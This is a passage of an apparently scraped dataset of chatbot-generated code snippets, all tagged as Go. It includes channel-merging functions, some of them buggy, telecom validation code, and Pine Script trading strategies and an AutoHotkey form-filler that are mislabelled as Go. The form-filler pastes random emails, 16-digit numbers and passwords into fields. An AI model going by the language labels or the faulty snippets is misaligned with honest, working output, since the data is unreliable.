    "code": "func merge2Channels(fn func(int) int, in1 <-chan int, in2 <-chan int, out chan<- int, n int) {\n\twg := &sync.WaitGroup{}\n\twg.Add(2)\n\n\tx1 := make([]int, n)\n\tx2 := make([]int, n)\n\n\tgo func() {\n\t\tdefer wg.Done()\n\t\tfor i := 0; i < n; i++ {\n\t\t\tselect {\n\t\t\tcase val, ok := <-in1:\n\t\t\t\tif ok {\n\t\t\t\t\tx1[i] = val\n\t\t\t\t} else {\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}()\n\n\tgo func() {\n\t\tdefer wg.Done()\n\t\tfor i := 0; i < n; i++ {\n\t\t\tselect {\n\t\t\tcase val, ok := <-in2:\n\t\t\t\tif ok {\n\t\t\t\t\tx2[i] = val\n\t\t\t\t} else {\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}()\n\n\tgo func() {\n\t\twg.Wait()\n\t\tout <- fn(x1[0]) + fn(x2[0])\n\t\tclose(out)\n\t}()\n}",
    "filename": "862dee81775d5cd2cd7ada0dde037529_2.go"
  },
  {
    "conversation_hash": "862dee81775d5cd2cd7ada0dde037529",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func merge2Channels(fn func(int) int, in1 <-chan int, in2 <-chan int, out chan<- int, n int) {\n\tresult := make(chan int, n)\n\n\tgo func() {\n\t\tdefer close(out)\n\t\tfor i := 0; i < n; i++ {\n\t\t\tx1 := <-in1\n\t\t\tx2 := <-in2\n\t\t\tresult <- fn(x1) + fn(x2)\n\t\t}\n\t}()\n\n\tfor i := 0; i < n; i++ {\n\t\tselect {\n\t\tcase val := <-result:\n\t\t\tout <- val\n\t\t}\n\t}\n}",
    "filename": "862dee81775d5cd2cd7ada0dde037529_3.go"
  },
  {
    "conversation_hash": "2994fcf025eb999f6cc2795ed57bcc00",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tin1 := make(chan int)\n\tin2 := make(chan int)\n\tout := make(chan int)\n\n\tgo func() {\n\t\tfor i := 0; i < 5; i++ {\n\t\t\tin1 <- i\n\t\t}\n\t\tclose(in1)\n\t}()\n\n\tgo func() {\n\t\tfor i := 10; i < 15; i++ {\n\t\t\tin2 <- i\n\t\t}\n\t\tclose(in2)\n\t}()\n\n\tgo merge2Channels(func(x int) int { return x }, in1, in2, out, 5)\n\n\tfor i := 0; i < 5; i++ {\n\t\tval := <-out\n\t\tfmt.Println(val)\n\t}\n}\n\nfunc merge2Channels(fn func(int) int, in1 <-chan int, in2 <-chan int, out chan<- int, n int) {\n\tresult := make(chan int, n)\n\n\tgo func() {\n\t\tdefer close(result)\n\t\tfor i := 0; i < n; i++ {\n\t\t\tx1 := <-in1\n\t\t\tx2 := <-in2\n\t\t\tresult <- fn(x1) + fn(x2)\n\t\t}\n\t}()\n\n\tfor i := 0; i < n; i++ {\n\t\tselect {\n\t\tcase val := <-result:\n\t\t\tout <- val\n\t\t}\n\t}\n}",
    "filename": "2994fcf025eb999f6cc2795ed57bcc00_0.go"
  },
  {
    "conversation_hash": "2994fcf025eb999f6cc2795ed57bcc00",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func merge2Channels(fn func(int) int, in1 <-chan int, in2 <-chan int, out chan<- int, n int) {\n\tresult := make(chan int, n)\n\n\tgo func() {\n\t\tdefer close(result)\n\t\tfor i := 0; i < n; i++ {\n\t\t\tselect {\n\t\t\tcase x1 := <-in1:\n\t\t\t\tselect {\n\t\t\t\tcase x2 := <-in2:\n\t\t\t\t\tresult <- fn(x1) + fn(x2)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}()\n\n\tfor i := 0; i < n; i++ {\n\t\tselect {\n\t\tcase val := <-result:\n\t\t\tout <- val\n\t\t}\n\t}\n}",
    "filename": "2994fcf025eb999f6cc2795ed57bcc00_1.go"
  },
  {
    "conversation_hash": "2994fcf025eb999f6cc2795ed57bcc00",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func merge2Channels(fn func(int) int, in1 <-chan int, in2 <-chan int, out chan<- int, n int) {\n\tresult := make(chan int, n)\n\n\tgo func() {\n\t\tdefer close(result)\n\t\tfor i := 0; i < n; i++ {\n\t\t\tx1, ok := <-in1\n\t\t\tif !ok {\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tx2, ok := <-in2\n\t\t\tif !ok {\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tresult <- fn(x1) + fn(x2)\n\t\t}\n\t}()\n\n\tfor i := 0; i < n; i++ {\n\t\tselect {\n\t\tcase val := <-result:\n\t\t\tout <- val\n\t\t}\n\t}\n}",
    "filename": "2994fcf025eb999f6cc2795ed57bcc00_2.go"
  },
  {
    "conversation_hash": "2994fcf025eb999f6cc2795ed57bcc00",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func merge2Channels(fn func(int) int, in1 <-chan int, in2 <-chan int, out chan<- int, n int) {\n\tresult := make(chan int, n)\n\n\tgo func() {\n\t\tdefer close(result)\n\t\tfor x1 := range in1 {\n\t\t\tx2, ok := <-in2\n\t\t\tif !ok {\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tresult <- fn(x1) + fn(x2)\n\t\t}\n\t}()\n\n\tfor i := 0; i < n; i++ {\n\t\tselect {\n\t\tcase val := <-result:\n\t\t\tout <- val\n\t\t}\n\t}\n}",
    "filename": "2994fcf025eb999f6cc2795ed57bcc00_3.go"
  },
  {
    "conversation_hash": "5041f46da2fcff9387239c533b36232e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "SetTitleMatchMode, 2\n\n+C::\nRandom, rnd1, 111111, 999999\nRandom, rnd2, 1111111111111111, 9999999999999999\nRandom, rnd3, 1, 99999\n\nclipboard := rnd1 . \"@gmail.com\"\nSend ^v\nSend {Tab}\n\nclipboard := rnd2\nSend ^v\nSend {Tab}\n\nclipboard := \"Aaaaaa(\" . rnd3\nSend ^v\nSend {Tab}\n\nreturn",
    "filename": "5041f46da2fcff9387239c533b36232e_0.go"
  },
  {
    "conversation_hash": "1446acec612f08721afd340707d849a8",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "{\n  \"outfits\": [\n    {\n      \"top\": \"Orange Sweat with Text\",\n      \"bottom\": \"Black Cargo Pants\",\n      \"description\": \"A casual and comfortable look. Pair the orange sweatshirt with black cargo pants for a laid-back style.\"\n    },\n    {\n      \"top\": \"Red T-shirt printed space-related\",\n      \"bottom\": \"Blue Jean Pants\",\n      \"description\": \"Vibrant and trendy outfit. Match the red space-themed t-shirt with blue jeans for a fun and youthful look.\"\n    },\n    {\n      \"top\": \"Black T-shirt with Supreme logo\",\n      \"bottom\": \"Orange Jean Pants\",\n      \"description\": \"Stylish and urban attire. Combine the black t-shirt with the Supreme logo with orange jeans for a fashionable edge.\"\n    },\n    {\n      \"top\": \"Orange Sweat with Fox\",\n      \"bottom\": \"Gray Shorts\",\n      \"description\": \"Relaxed and sporty ensemble. Opt for an easygoing outfit by pairing the orange sweatshirt with gray shorts.\"\n    }\n  ]\n}",
    "filename": "1446acec612f08721afd340707d849a8_2.go"
  },
  {
    "conversation_hash": "8e5152fa93b1c28ab4d3dd418389be2d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n)\n\n// Node is a custom type that represents *model.ENodeB and *model.EUtranCellData\n// of cosite Node for Elastic Ran\ntype Node struct {\n\tENodeB         `json:\"ENodeB\"`\n\tEUtranCellData `json:\"EUtranCellData\"`\n}\n\n// Nodes is a custom type that represents a map of *model.Node\ntype Nodes map[string]*Node\n\n// ENodeB represents model.ENodeB\ntype ENodeB struct {\n\t// fields of ENodeB struct\n}\n\n// EUtranCellData represents model.EUtranCellData\ntype EUtranCellData struct {\n\tCellsGroups []CellGroup `json:\"CellsGroups\"`\n}\n\n// CellGroup represents a group of cells\ntype CellGroup struct {\n\t// fields of CellGroup struct\n}\n\n// CleanEmpty deletes Cosite nodes if lte cell data is empty\nfunc (nodes Nodes) CleanEmpty() {\n\tfor key, node := range nodes {\n\t\tif len(node.EUtranCellData.CellsGroups) == 0 {\n\t\t\tdelete(nodes, key)\n\t\t}\n\t}\n}\n\nfunc main() {\n\t// Example usage\n\tdata := `{\n\t\t\"node1\": {\n\t\t\t\"ENodeB\": {},\n\t\t\t\"EUtranCellData\": {\n\t\t\t\t\"CellsGroups\": []\n\t\t\t}\n\t\t},\n\t\t\"node2\": {\n\t\t\t\"ENodeB\": {},\n\t\t\t\"EUtranCellData\": {\n\t\t\t\t\"CellsGroups\": [\n\t\t\t\t\t{\n\t\t\t\t\t\t\"field1\": \"value1\"\n\t\t\t\t\t}\n\t\t\t\t]\n\t\t\t}\n\t\t}\n\t}`\n\n\tvar nodes Nodes\n\terr := json.Unmarshal([]byte(data), &nodes)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"Before cleaning:\")\n\tfor key, node := range nodes {\n\t\tfmt.Printf(\"%s: EUtranCellData Length - %d\\n\", key, len(node.EUtranCellData.CellsGroups))\n\t}\n\n\tnodes.CleanEmpty()\n\n\tfmt.Println(\"\\nAfter cleaning:\")\n\tfor key, node := range nodes {\n\t\tfmt.Printf(\"%s: EUtranCellData Length - %d\\n\", key, len(node.EUtranCellData.CellsGroups))\n\t}\n}",
    "filename": "8e5152fa93b1c28ab4d3dd418389be2d_0.go"
  },
  {
    "conversation_hash": "8077641bc0dd2b18ab1bd712c5bf476e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// Count counts number of Cosite nodes\nfunc (nodes *Nodes) Count() int {\n\tcount := 0\n\tfor _, node := range *nodes {\n\t\tif node != nil && len(node.EUtranCellData.CellsGroups) > 0 {\n\t\t\tcount++\n\t\t}\n\t}\n\treturn count\n}",
    "filename": "8077641bc0dd2b18ab1bd712c5bf476e_0.go"
  },
  {
    "conversation_hash": "21f05cde5d93877d05b209997bf45cca",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "if len(nodes) == 1 {\n\tnodesname := \"\"\n\tfor key := range nodes {\n\t\tnodesname = key\n\t\tbreak\n\t}\n\telasticran.TnPort2 = \"\"\n\tif strings.HasPrefix(name, \"GRBS\") {\n\t\telasticran.TnPort = \"TN_IDL_C\"\n\t} else if strings.HasPrefix(name, \"ERBS\") && strings.Contains(name, \"_1_\") && strings.HasPrefix(nodesname, \"GRBS\") {\n\t\tif subNetwork == \"Shymkent\" {\n\t\t\telasticran.TnPort = \"TN_IDL_C\"\n\t\t} else {\n\t\t\telasticran.TnPort = \"TN_A\"\n\t\t}\n\t} else if strings.HasPrefix(name, \"ERBS\") && strings.Contains(name, \"_1_\") {\n\t\tif subNetwork == \"Shymkent\" {\n\t\t\telasticran.TnPort = \"TN_IDL_D\"\n\t\t} else {\n\t\t\telasticran.TnPort = \"TN_B\"\n\t\t}\n\t} else if strings.HasPrefix(name, \"ERBS\") && strings.Contains(name, \"_2_\") {\n\t\tif subNetwork == \"Shymkent\" {\n\t\t\telasticran.TnPort = \"TN_IDL_C\"\n\t\t} else {\n\t\t\telasticran.TnPort = \"TN_A\"\n\t\t}\n\t}\n}",
    "filename": "21f05cde5d93877d05b209997bf45cca_0.go"
  },
  {
    "conversation_hash": "9bf7b59fee0431dc46806068b2804733",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "// Name returns an array of keys from the Nodes map\nfunc (nodes *Nodes) Name() []string {\n\tkeys := make([]string, len(*nodes))\n\ti := 0\n\tfor key := range *nodes {\n\t\tkeys[i] = key\n\t\ti++\n\t}\n\treturn keys\n}",
    "filename": "9bf7b59fee0431dc46806068b2804733_0.go"
  },
  {
    "conversation_hash": "617757d532c63c6d70dd4debff27a9a4",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc task() {\n\tfor i := 1; i <= 5; i++ {\n\t\tfmt.Println(\"Task\", i)\n\t\ttime.Sleep(time.Second)\n\t}\n}\n\nfunc main() {\n\tgo task() // Avvia task in una goroutine\n\n\t// Continua l'esecuzione del codice principale\n\t// senza attendere il completamento di task\n\tfor i := 1; i <= 3; i++ {\n\t\tfmt.Println(\"Main\", i)\n\t\ttime.Sleep(time.Second)\n\t}\n}",
    "filename": "617757d532c63c6d70dd4debff27a9a4_0.go"
  },
  {
    "conversation_hash": "617757d532c63c6d70dd4debff27a9a4",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc producer(ch chan<- int) {\n\tfor i := 1; i <= 5; i++ {\n\t\tch <- i\n\t\ttime.Sleep(time.Second)\n\t}\n\tclose(ch)\n}\n\nfunc consumer(ch <-chan int) {\n\tfor num := range ch {\n\t\tfmt.Println(\"Received:\", num)\n\t}\n}\n\nfunc main() {\n\tch := make(chan int)\n\n\tgo producer(ch) // Avvia il produttore in una goroutine\n\tconsumer(ch)    // Consuma i valori dal canale\n\n\ttime.Sleep(5 * time.Second) // Aspetta 5 secondi per dare il tempo alla produzione e al consumo\n}",
    "filename": "617757d532c63c6d70dd4debff27a9a4_1.go"
  },
  {
    "conversation_hash": "1905f3503a6c7ccbb91b7b522f664483",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Supertrend RTX with Trailing Stop and Hull Moving Average Filter\", overlay=true)\n\n// Input variables\natrPeriod = input(10, \"ATR Length\")\nfactor = input.float(3.0, \"Factor\", step=0.01)\ntrailingStopPercentage = input(1.0, \"Trailing Stop Percentage\", step=0.1)\nhullPeriod = input(14, \"Hull Moving Average Period\")\n\n// Calculate Supertrend\n[supertrend, direction] = ta.supertrend(factor, atrPeriod)\n\n// Calculate Hull Moving Average\nhull = ta.hma(close, hullPeriod)\n\n// Plot Supertrend and Hull Moving Average\nbodyMiddle = plot((open + close) / 2, display=display.none)\nupTrend = plot(direction < 0 ? supertrend : na, \"Up Trend\", color=color.green, style=plot.style_linebr)\ndownTrend = plot(direction < 0 ? na : supertrend, \"Down Trend\", color=color.red, style=plot.style_linebr)\nhullPlot = plot(hull, \"Hull Moving Average\", color=color.blue)\n\n// Fill body middle\nfill(bodyMiddle, upTrend, color.new(color.green, 90), fillgaps=false)\nfill(bodyMiddle, downTrend, color.new(color.red, 90), fillgaps=false)\n\n// Entry Rules\nlongCondition = ta.crossover(close, supertrend) and close > hull\nshortCondition = ta.crossunder(close, supertrend) and close < hull\n\n// Exit Rules\nlongExitCondition = ta.crossunder(close, hull)\nshortExitCondition = ta.crossover(close, hull)\n\n// Trailing Stop\nvar float longTrailingStopPrice = na\nvar float shortTrailingStopPrice = na\n\nif (longCondition)\n    strategy.entry(\"Long\", strategy.long)\n    longTrailingStopPrice := close * (1 - trailingStopPercentage / 100)\n\nif (shortCondition)\n    strategy.entry(\"Short\", strategy.short)\n    shortTrailingStopPrice := close * (1 + trailingStopPercentage / 100)\n\nif (longExitCondition)\n    strategy.close(\"Long\")\n\nif (shortExitCondition)\n    strategy.close(\"Short\")\n\nif (strategy.position_size > 0)\n    strategy.exit(\"Long Exit\", \"Long\", trail_price=longTrailingStopPrice)\nelse if (strategy.position_size < 0)\n    strategy.exit(\"Short Exit\", \"Short\", trail_price=shortTrailingStopPrice)",
    "filename": "1905f3503a6c7ccbb91b7b522f664483_0.go"
  },
  {
    "conversation_hash": "78e1738bf120e3004c57586c8c6afb5a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Supertrend RTX with Trailing Stop and Hull Moving Average Filter\", overlay=true)\n\n// Input variables\natrPeriod = input(10, \"ATR Length\")\nfactor = input.float(3.0, \"Factor\", step=0.01)\ntrailingStopPercentage = input(1.0, \"Trailing Stop Percentage\", step=0.1)\nhullPeriod = input(14, \"Hull Moving Average Period\")\n\n// Calculate Supertrend\n[supertrend, direction] = ta.supertrend(factor, atrPeriod)\n\n// Calculate Hull Moving Average\nhull = ta.hma(close, hullPeriod)\n\n// Plot Supertrend and Hull Moving Average\nbodyMiddle = plot((open + close) / 2, display=display.none)\nupTrend = plot(direction < 0 ? supertrend : na, \"Up Trend\", color=color.green, style=plot.style_linebr)\ndownTrend = plot(direction < 0 ? na : supertrend, \"Down Trend\", color=color.red, style=plot.style_linebr)\nhullPlot = plot(hull, \"Hull Moving Average\", color=color.blue)\n\n// Fill body middle\nfill(bodyMiddle, upTrend, color.new(color.green, 90), fillgaps=false)\nfill(bodyMiddle, downTrend, color.new(color.red, 90), fillgaps=false)\n\n// Entry Rules\nlongCondition = ta.crossover(close, supertrend) and close > hull\nshortCondition = ta.crossunder(close, supertrend) and close < hull\n\n// Exit Rules\nlongExitCondition = ta.crossunder(close, hull)\nshortExitCondition = ta.crossover(close, hull)\n\n// Trailing Stop\nvar float longTrailingStopPrice = na\nvar float shortTrailingStopPrice = na\n\nif longCondition\n    strategy.order(\"Long\", strategy.long)\n    longTrailingStopPrice := close * (1 - trailingStopPercentage / 100)\n\nif shortCondition\n    strategy.order(\"Short\", strategy.short)\n    shortTrailingStopPrice := close * (1 + trailingStopPercentage / 100)\n\nif longExitCondition\n    strategy.order(\"Long Exit\", strategy.short)\n\nif shortExitCondition\n    strategy.order(\"Short Exit\", strategy.long)\n\nif strategy.position_size > 0\n    strategy.order(\"Long Exit\", strategy.long, exit_type=strategy.exit_trail, trail_price=longTrailingStopPrice)\nelse if strategy.position_size < 0\n    strategy.order(\"Short Exit\", strategy.short, exit_type=strategy.exit_trail, trail_price=shortTrailingStopPrice)",
    "filename": "78e1738bf120e3004c57586c8c6afb5a_0.go"
  },
  {
    "conversation_hash": "78e1738bf120e3004c57586c8c6afb5a",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Supertrend RTX with Trailing Stop and Hull Moving Average Filter\", overlay=true)\n\n// Input variables\natrPeriod = input(10, \"ATR Length\")\nfactor = input.float(3.0, \"Factor\", step=0.01)\ntrailingStopPercentage = input(1.0, \"Trailing Stop Percentage\", step=0.1)\nhullPeriod = input(14, \"Hull Moving Average Period\")\n\n// Calculate Supertrend\n[supertrend, direction] = ta.supertrend(factor, atrPeriod)\n\n// Calculate Hull Moving Average\nhull = ta.hma(close, hullPeriod)\n\n// Plot Supertrend and Hull Moving Average\nbodyMiddle = plot((open + close) / 2, display=display.none)\nupTrend = plot(direction < 0 ? supertrend : na, \"Up Trend\", color=color.green, style=plot.style_linebr)\ndownTrend = plot(direction < 0 ? na : supertrend, \"Down Trend\", color=color.red, style=plot.style_linebr)\nhullPlot = plot(hull, \"Hull Moving Average\", color=color.blue)\n\n// Fill body middle\nfill(bodyMiddle, upTrend, color.new(color.green, 90), fillgaps=false)\nfill(bodyMiddle, downTrend, color.new(color.red, 90), fillgaps=false)\n\n// Entry Rules\nlongCondition = ta.crossover(close, supertrend) and close > hull\nshortCondition = ta.crossunder(close, supertrend) and close < hull\n\n// Exit Rules\nlongExitCondition = ta.crossunder(close, hull)\nshortExitCondition = ta.crossover(close, hull)\n\n// Trailing Stop\nvar float longTrailingStopPrice = na\nvar float shortTrailingStopPrice = na\n\nif longCondition\n    strategy.entry(\"Long\", strategy.long)\n    longTrailingStopPrice := close * (1 - trailingStopPercentage / 100)\n\nif shortCondition\n    strategy.entry(\"Short\", strategy.short)\n    shortTrailingStopPrice := close * (1 + trailingStopPercentage / 100)\n\nif longExitCondition\n    strategy.exit(\"Long Exit\", \"Long\", stop=longTrailingStopPrice)\n\nif shortExitCondition\n    strategy.exit(\"Short Exit\", \"Short\", stop=shortTrailingStopPrice)",
    "filename": "78e1738bf120e3004c57586c8c6afb5a_1.go"
  },
  {
    "conversation_hash": "78e1738bf120e3004c57586c8c6afb5a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Supertrend RTX with Trailing Stop and Hull Moving Average Filter\", overlay=true)\n\n// Input variables\natrPeriod = input(10, \"ATR Length\")\nfactor = input.float(3.0, \"Factor\", step=0.01)\ntrailingStopPercentage = input(1.0, \"Trailing Stop Percentage\", step=0.1)\nhullPeriod = input(14, \"Hull Moving Average Period\")\n\n// Calculate Supertrend\n[supertrend, direction] = ta.supertrend(factor, atrPeriod)\n\n// Calculate Hull Moving Average\nhull = ta.hma(close, hullPeriod)\n\n// Plot Supertrend and Hull Moving Average\nbodyMiddle = plot((open + close) / 2, display=display.none)\nupTrend = plot(direction < 0 ? supertrend : na, \"Up Trend\", color=color.green, style=plot.style_linebr)\ndownTrend = plot(direction < 0 ? na : supertrend, \"Down Trend\", color=color.red, style=plot.style_linebr)\nhullPlot = plot(hull, \"Hull Moving Average\", color=color.blue)\n\n// Fill body middle\nfill(bodyMiddle, upTrend, color.new(color.green, 90), fillgaps=false)\nfill(bodyMiddle, downTrend, color.new(color.red, 90), fillgaps=false)\n\n// Entry Rules\nlongCondition = ta.crossover(close, supertrend) and close > hull\nshortCondition = ta.crossunder(close, supertrend) and close < hull\n\n// Exit Rules\nlongExitCondition = ta.crossunder(close, hull)\nshortExitCondition = ta.crossover(close, hull)\n\n// Trailing Stop\nvar float longTrailingStopPrice = na\nvar float shortTrailingStopPrice = na\n\nif longCondition\n    strategy.entry(\"Long\", strategy.long)\n    longTrailingStopPrice := close * (1 - trailingStopPercentage / 100)\n\nif shortCondition\n    strategy.entry(\"Short\", strategy.short)\n    shortTrailingStopPrice := close * (1 + trailingStopPercentage / 100)\n\nif longExitCondition\n    strategy.exit(\"Long Exit\", \"Long\", stop=longTrailingStopPrice)\n\nif shortExitCondition\n    strategy.exit(\"Short Exit\", \"Short\", stop=shortTrailingStopPrice)",
    "filename": "78e1738bf120e3004c57586c8c6afb5a_2.go"
  },
  {
    "conversation_hash": "78e1738bf120e3004c57586c8c6afb5a",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Supertrend RTX with Trailing Stop and Hull Moving Average Filter\", overlay=true)\n\n// Input variables\natrPeriod = input(10, \"ATR Length\")\nfactor = input.float(3.0, \"Factor\", step=0.01)\ntrailingStopPercentage = input(1.0, \"Trailing Stop Percentage\", step=0.1)\nhullPeriod = input(14, \"Hull Moving Average Period\")\n\n// Calculate Supertrend\n[supertrend, direction] = ta.supertrend(factor, atrPeriod)\n\n// Calculate Hull Moving Average\nhull = ta.hma(close, hullPeriod)\n\n// Plot Supertrend and Hull Moving Average\nbodyMiddle = plot((open + close) / 2, display=display.none)\nupTrend = plot(direction < 0 ? supertrend : na, \"Up Trend\", color=color.green, style=plot.style_linebr)\ndownTrend = plot(direction < 0 ? na : supertrend, \"Down Trend\", color=color.red, style=plot.style_linebr)\nhullPlot = plot(hull, \"Hull Moving Average\", color=color.blue)\n\n// Fill body middle\nfill(bodyMiddle, upTrend, color.new(color.green, 90), fillgaps=false)\nfill(bodyMiddle, downTrend, color.new(color.red, 90), fillgaps=false)\n\n// Entry Rules\nlongCondition = ta.crossover(close, supertrend) and close > hull\nshortCondition = ta.crossunder(close, supertrend) and close < hull\n\n// Exit Rules\nlongExitCondition = ta.crossunder(close, hull)\nshortExitCondition = ta.crossover(close, hull)\n\n// Trailing Stop\nvar float longTrailingStopPrice = na\nvar float shortTrailingStopPrice = na\n\nif longCondition\n    strategy.entry(\"Long\", strategy.long)\n    longTrailingStopPrice := close * (1 - trailingStopPercentage / 100)\n\nif shortCondition\n    strategy.entry(\"Short\", strategy.short)\n    shortTrailingStopPrice := close * (1 + trailingStopPercentage / 100)\n\nif longExitCondition\n    strategy.exit(\"Long Exit\", \"Long\", stop=longTrailingStopPrice)\n\nif shortExitCondition\n    strategy.exit(\"Short Exit\", \"Short\", stop=shortTrailingStopPrice)",
    "filename": "78e1738bf120e3004c57586c8c6afb5a_3.go"
  },
  {
    "conversation_hash": "f581add0d9545bae932d1674a92ab86d",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "longTrailingStopPrice := close * (1 - trailingStopPercentage / 100)\nstrategy.exit(\"Long Exit\", \"Long\", stop=longTrailingStopPrice)\n\nshortTrailingStopPrice := close * (1 + trailingStopPercentage / 100)\nstrategy.exit(\"Short Exit\", \"Short\", stop=shortTrailingStopPrice)",
    "filename": "f581add0d9545bae932d1674a92ab86d_1.go"
  },
  {
    "conversation_hash": "77f5684b07f50e61f3a9da1c056ec48a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Supertrend RTX001\", overlay=true)\n\n// Input variables\natrPeriod = input(10, \"ATR Length\")\nfactor = input.float(3.0, \"Factor\", step=0.01)\ntrailingStopPercentage = input.float(1.0, \"Trailing Stop Percentage\", step=0.1)\nhullPeriod = input(14, \"Hull Moving Average Period\")\n\n// Calculate Supertrend\n[supertrend, direction] = ta.supertrend(factor, atrPeriod)\n\n// Calculate Hull Moving Average\nhull = ta.hma(close, hullPeriod)\n\n// Plot Supertrend and Hull Moving Average\nbodyMiddle = plot((open + close) / 2, display=display.none)\nupTrend = plot(direction < 0 ? supertrend : na, \"Up Trend\", color=color.green, style=plot.style_linebr)\ndownTrend = plot(direction < 0 ? na : supertrend, \"Down Trend\", color=color.red, style=plot.style_linebr)\nhullPlot = plot(hull, \"Hull Moving Average\", color=color.blue)\n\n// Fill body middle\nfill(bodyMiddle, upTrend, color.new(color.green, 90), fillgaps=false)\nfill(bodyMiddle, downTrend, color.new(color.red, 90), fillgaps=false)\n\n// Entry Rules\nlongCondition = ta.crossover(close, supertrend) and close > hull\nshortCondition = ta.crossunder(close, supertrend) and close < hull\n\n// Exit Rules\nlongExitCondition = ta.crossunder(close, hull)\nshortExitCondition = ta.crossover(close, hull)\n\n// Trailing Stop\nvar float longTrailingStopPrice = na\nvar float shortTrailingStopPrice = na\n\nif longCondition\n    strategy.entry(\"Long\", strategy.long)\n    longTrailingStopPrice := close * (1 - trailingStopPercentage / 100)\n\nif shortCondition\n    strategy.entry(\"Short\", strategy.short)\n    shortTrailingStopPrice := close * (1 + trailingStopPercentage / 100)\n\nif longExitCondition\n    strategy.close(\"Long\")\n\nif shortExitCondition\n    strategy.close(\"Short\")",
    "filename": "77f5684b07f50e61f3a9da1c056ec48a_0.go"
  },
  {
    "conversation_hash": "2be55b8ebe36fe6c30f06c96391ffdfc",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func (c *EranConnection) Validate() error {\n\t// Validate Vlan for Elastic Ran\n\tif err := c.Vlan.ValidateId(); err != nil {\n\t\treturn err\n\t}\n\tif err := c.Vlan.ValidateEranVlan(); err != nil {\n\t\treturn err\n\t}\n\n\t// Validate SubNetwork\n\tif err := c.SubNetwork.Validate(); err != nil {\n\t\treturn err\n\t}\n\n\t// Validate Connection field\n\terr := validation.Validate(c.Connection,\n\t\tvalidation.Required,\n\t\tvalidation.In(validEranConnections...),\n\t)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Validate TnPort field if Connection is \"Direct\"\n\tif c.Connection == \"Direct\" {\n\t\terr = validation.Validate(c.TnPort,\n\t\t\tvalidation.Required,\n\t\t\tvalidation.In(validEranPorts...),\n\t\t)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\terr = validation.Validate(c.TnPort2,\n\t\t\tvalidation.Required,\n\t\t\tvalidation.In(validEranPorts...),\n\t\t)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\t// Validate Bridge\n\terr = validation.Validate(c.Bridge,\n\t\tvalidation.Required,\n\t\tvalidation.In(validEranBriges...),\n\t)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}",
    "filename": "2be55b8ebe36fe6c30f06c96391ffdfc_0.go"
  },
  {
    "conversation_hash": "2be55b8ebe36fe6c30f06c96391ffdfc",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "// Validate TnPort field if Connection is \"Direct\"\nif c.Connection == \"Direct\" {\n\terr = validation.Validate(c.TnPort,\n\t\tvalidation.EmptyOr(validation.In(validEranPorts...)),\n\t)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\terr = validation.Validate(c.TnPort2,\n\t\tvalidation.EmptyOr(validation.In(validEranPorts...)),\n\t)\n\tif err != nil {\n\t\treturn err\n\t}\n}",
    "filename": "2be55b8ebe36fe6c30f06c96391ffdfc_1.go"
  },
  {
    "conversation_hash": "2be55b8ebe36fe6c30f06c96391ffdfc",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// Validate TnPort field if Connection is \"Direct\"\nif c.Connection == \"Direct\" {\n\terr = validation.Validate(c.TnPort,\n\t\tvalidation.By(func(value interface{}) error {\n\t\t\ttnPort := value.(string)\n\n\t\t\t// Check that at least one of the TnPort fields is non-empty\n\t\t\tif tnPort == \"\" && c.TnPort2 == \"\" {\n\t\t\t\treturn validation.NewError(\"TnPort\", \"At least one of TnPort fields should be present\")\n\t\t\t}\n\n\t\t\t// Validate TnPort if it's not empty\n\t\t\tif tnPort != \"\" {\n\t\t\t\treturn validation.Validate(tnPort, validation.In(validEranPorts...))\n\t\t\t}\n\n\t\t\treturn nil\n\t\t}),\n\t)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\terr = validation.Validate(c.TnPort2,\n\t\tvalidation.EmptyOr(validation.In(validEranPorts...)),\n\t)\n\tif err != nil {\n\t\treturn err\n\t}\n}",
    "filename": "2be55b8ebe36fe6c30f06c96391ffdfc_2.go"
  },
  {
    "conversation_hash": "ab981fd906a3b455b46931e9fa1a53fe",
    "code_index": 0,
    "language": "Go",
